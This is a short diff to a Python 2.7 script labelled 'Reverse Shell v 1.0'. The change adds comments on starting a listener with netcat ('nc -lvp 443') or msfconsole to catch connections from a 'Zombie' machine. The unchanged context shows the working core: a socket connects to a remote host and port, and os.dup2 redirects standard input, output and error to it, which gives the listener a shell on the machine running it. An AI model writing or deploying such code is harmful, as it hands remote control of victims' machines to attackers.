@@ -3,7 +3,9 @@
 # Reverse Shell v 1.0
 # Python 2.7.x
 # It connects to Host & Port given to It
-# First set a Listener to grab connection from Zombie 
+# First set a Listener to grab connection from Zombie
+# Listener examples: netcat, msfconsole or other ones
+# Example: nc -lvp 443
 # Enjoy It :)
 
 import socket
@@ -20,7 +22,6 @@ print "[+] Running ..." #########################
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP_Socket_Variable
 s.connect((rhost , rport))                            # Socket_Connection
-
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
